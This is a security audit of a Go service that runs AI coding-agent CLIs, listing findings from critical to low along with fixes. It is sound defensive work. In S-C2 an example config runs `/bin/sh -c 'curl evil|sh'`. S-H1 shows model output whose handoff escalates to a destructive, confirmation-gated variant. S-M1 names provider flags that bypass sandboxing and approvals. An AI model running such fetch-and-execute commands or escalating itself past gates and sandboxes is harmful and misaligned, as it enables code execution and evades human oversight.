# Step 2A Raw Findings: Security Audit

**Verified against working tree at commit `d41e37e`.** `govulncheck ./...` run: no called vulnerabilities (1 imported + 5 required-module advisories, no vulnerable symbol reached).

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 4 |
| Medium | 5 |
| Low | 4 |

## CRITICAL

### S-C1 — Durable service spawns confirmation-gated destructive variants with no gate, no spend cap, no confirmation
**CWE-862 / CWE-306. CVSS ~8.6.**
- `internal/runtime/service.go:824-832` (`chooseProfile`), `421-448` (`dispatchOnce`), `680-686` (`variantAllowed`)
- `internal/variant/savage.go:15-39`, `world_breaker.go:64-91`, `old_man.go:120-142` — all set `DurableAllowed: true`, `ConfirmationGate`, `RequireSpendCap: true`
- Contrast `cmd/radioactive_ralph/run.go:60-98` (attached path enforces gates).

Durable path selects variant by name via `chooseProfile` → `variant.Lookup`; the only pre-spawn checks are `variantAllowed` (returns `DurableAllowed`, true for all three destructive variants) and `hasCapacity`. `startWorker`/`executeWorker` never consult `HasGate()`, `ConfirmationGate`, `gateConfirmed`, or `RequireSpendCap`. The `--confirm-*` flags exist only on `RunCmd`.

**Attack:** Anyone who can land/import a plan (committed `.radioactive-ralph/` plan, `plan import`, malicious PR) sets `primary_variant: "world-breaker"` or `variant_hint: "old-man"`. On tick, the service spawns the destructive persona running the provider with sandbox/approvals bypassed — force-resets branches, resolves `-X ours`, burns unbounded budget. No confirmation, no cap.

**Fix:** Enforce the gate in durable dispatch before `startWorker`; carry an explicit per-variant durable confirmation record; `variant.Validate()` should reject `DurableAllowed`+gated unless a durable confirmation mechanism exists.

### S-C2 — Committed `config.toml` fully controls the executed provider binary and its argv
**CWE-829 / CWE-94. CVSS ~8.4.**
- `internal/config/config.go` (`Load` reads committed `.radioactive-ralph/config.toml`)
- `internal/initcmd/write.go:67` (written `0o644`, committed)
- `internal/provider/provider.go` `ResolveBinding` (`Binary`/`Type`/`Args` attacker-influenceable), `claude.go`/`codex.go`/`gemini.go` (`binding.Config.Args` appended), `declarative.go` (`binding.Config.Binary` + templated args)

No allowlist of binaries, no validation that `binary` is a known provider CLI; arbitrary `args` appended to every invocation. A malicious PR to `config.toml` (`type="plain-stdout" binary="/bin/sh" args=["-c","curl evil|sh"]`) executes on the next tick/run. Bypasses the scrutiny a `.go` change would attract.

**Fix:** Allowlist `binary` to shipped provider names or a trusted-dir absolute path; move arbitrary-binary override to gitignored `local.toml`; validate in `ValidateBinding`; reject/scrub dangerous `args`; refuse auto-run if `config.toml` changed since install without re-confirmation.

## HIGH

### S-H1 — Malicious/compromised provider (AI) output can drive privileged state transitions
**CWE-807 / CWE-20. CVSS ~7.1.** `internal/runtime/result.go` `parseWorkerResult`; `service.go:495-590` switch on `parsed.Outcome`.

Parsed AI output (`DisallowUnknownFields`, good) drives `MarkDone`/`RequeueTaskWithPayload`; the `handoff` outcome sets a new variant via `HandoffTo` → next task's `VariantHint` → `chooseProfile`. Combined with S-C1, `{"outcome":"handoff","handoff_to":"world-breaker"}` self-escalates to a destructive gated variant. `approval_required:false` from the model is trusted as-is.

**Fix:** Validate `handoff_to` against a policy allowlist; never let model output select a gated/destructive variant without the S-C1 gate; never let model-supplied `approval_required=false` downgrade a task policy says needs approval.

### S-H2 — Unbounded IPC request frame (memory-exhaustion DoS)
**CWE-770 / CWE-400. CVSS ~5.5 (same-user only, 0600 socket).** `internal/ipc/server.go:189-193` (`bufio.ReadBytes('\n')`), client readers same pattern.

`ReadBytes('\n')` buffers unboundedly until newline; a peer that never sends `\n` or sends a multi-GB line forces unbounded allocation. No per-connection read deadline; idle connections hold goroutines. The declarative stream-json path bounds its scanner (16MB) — the IPC server does not.

**Fix:** `io.LimitReader(conn, maxFrameBytes)` (~1MB) + `bufio.Scanner` with capped `Buffer`; `conn.SetReadDeadline` for the initial read.

### S-H3 — No IPC protocol versioning; `enqueue` writes a dead table; malformed args default silently
**CWE-1059 / CWE-20. CVSS ~4.0.** `internal/ipc/server.go` switch; `internal/runtime/handler.go:25-37` → `internal/db/db.go:233` `EnqueueTask`.

No version field; a mismatched client deserializes into zero-valued structs (a malformed `StopArgs` becomes a valid non-graceful stop because the handler only errors when `len(req.Args)>0` and unmarshal fails). `enqueue` persists into the event-log `tasks` table the plandag scheduler never reads.

**Fix:** Add `version` to `Request`, reject unknown; remove or wire up `HandleEnqueue`/`EnqueueTask`; treat empty/malformed args as explicit errors for state-changing commands.

### S-H4 — Durable SQLite state writes silently discarded on error (integrity gap)
**CWE-252 / CWE-703. CVSS ~4.9.** `service.go:495-590` (`_, _ =` on `MarkDone`/`MarkFailed`/`RequeueTaskWithPayload`/`MarkBlocked`); `db.go:256` swallows FTS error.

A failed terminal write (disk full, lock, closed DB) leaves the task `running`/`claimed` with no durable record — orphaned. Under S-C1/S-C2, a destructive action can occur while its audit record fails silently. *(Same as Phase 1 Q-C1.)*

**Fix:** Check/log/retry every state-transition write; don't release the worker slot without recording the orphan; emit `worker.state_write_failed`.

## MEDIUM

- **S-M1 — Provider CLIs invoked with sandbox/approval fully disabled** (CWE-272): codex `--dangerously-bypass-approvals-and-sandbox`, gemini `--approval-mode yolo`, claude broad `--allowed-tools`. Intended autonomy model, but combined with S-C1/S-C2 any escalation yields unsandboxed execution. Ensure only reachable after the S-C1 gate; consider per-variant sandbox tiers.
- **S-M2 — `plan import` reads arbitrary path; plan fields unvalidated** (CWE-20): `cmd/radioactive_ralph/plan.go:570` `os.ReadFile(c.Path)`. Parsed `slug`/`primary_variant`/`variant_hint`/`depends_on` inserted with no variant-permission or acyclicity validation — the injection vector for S-C1. Validate variants against a permitted set at import; reject gated variants unless confirmed; validate the DAG.
- **S-M3 — `file://` mirror URL by string concat** (CWE-20): `internal/workspace/git.go:15` `"file://" + repoPath`. Not currently exploitable (argv, no shell), but a crafted `repoPath` suffix could redirect the clone, and clone/worktree commands lack a `--` positional separator. Validate `repoPath` is an absolute cleaned path to an existing `.git`; add `--`.
- **S-M4 — World-readable config/state (0o644 / 0o750)** (CWE-732): `internal/initcmd/write.go`. `local.toml` (operator overrides incl. `provider_binary`) is world-readable; fragile given S-C2. Write `local.toml` `0o600`; machine-local state dir `0o700`.
- **S-M5 — `renderArgTemplate` injects prompt content into argv positions** (CWE-88): `internal/provider/declarative.go:236` substitutes `{prompt}`/`{system_prompt}` into `args[]`. Argv injection (not shell) — a value starting with `-` in a bare slot could parse as a flag. Config-authored but config is attacker-influenceable (S-C2). Place untrusted positionals after `--` or validate they don't start with `-`.

## LOW

- **S-L1** — `normalizeStructuredOutput`/`parseWorkerResult` first-`{`-to-last-`}` slicing (`provider/exec.go`, `runtime/result.go`) can misparse adjacent/injected braces; `DisallowUnknownFields` limits impact. Prefer strict extraction / single fenced block.
- **S-L2** — PID file trust (`runtime/flock.go`): `0o600` + flock (good), but `stop`/status rely on heartbeat mtime, not PID identity — a reused stale PID isn't detected. Low risk single-user.
- **S-L3** — Error messages leak full argv + stderr (`provider/exec.go:44`), possibly surfacing prompt contents into the event log. Scrub prompt tokens from error strings.
- **S-L4** — No Unix-socket peer credential check (POSIX `internal/ipc`): rests on `0o600` socket + `0o700` dir; no `SO_PEERCRED`/UID assertion, so any same-user process can drive the service (incl. `stop`). Acceptable for threat model; document it.

## Checked and clean

- **CI workflows** — well-hardened: all third-party actions SHA-pinned; default `permissions: contents: read`; elevated perms scoped per-job; **no `pull_request_target`**, no untrusted `${{ github.event.* }}` in `run:`; auto-merge gated to `dependabot[bot]`/`release-please--*`; CodeQL `security-and-quality`; no secrets echoed.
- **SQL injection** — all queries use `?` bound params; the one `fmt.Sprintf` (`plandag/query.go:1093`) builds only a placeholder list; FTS `MATCH` uses bound `ftsPhrase`.
- **`exec.Command` usage** — every subprocess is `exec.CommandContext(bin, args...)`, no `sh -c`, no shell interpolation anywhere in `internal/provider/` or `internal/workspace/`; git runs with `GIT_TERMINAL_PROMPT=0`. Residual risk is argv/config injection (S-C2/S-M5), not shell.
- **Unix socket mode** — `os.Remove` + `net.Listen("unix")` + `Chmod 0o600`, parent `0o700`; Windows named pipe restricted to current-user SID.
- **launchd/systemd units** — per-user (not root); `ExecStart`/`ProgramArguments` XML-escaped; no privilege escalation, no root install path.
- **Deserialization** — TOML (BurntSushi), JSON stdlib with `DisallowUnknownFields` on the worker-result decode; plan-import uses JSON not YAML; no gob/unsafe decoders.
- **Hardcoded secrets** — none in Go source; provider credentials delegated to underlying CLIs (env/keychain).
- **Dependencies** — `govulncheck` clean; Go 1.26, kong 1.15, modernc/sqlite 1.48, charmbracelet current.

## Top remediation priorities
1. **S-C1** — wire gate + spend-cap enforcement into `internal/runtime` dispatch (also neutralizes the H-1 self-escalation chain).
2. **S-C2** — constrain provider `binary`/`args` from committed `config.toml`; arbitrary override to `local.toml` only; allowlist in `ValidateBinding`.
3. **S-H1** — policy-check model-supplied `handoff_to`; never trust model output to select a destructive variant or waive approval.
4. **S-H2** — bound IPC frame size + read deadlines.
5. **S-H4** — stop discarding durable state-write errors.
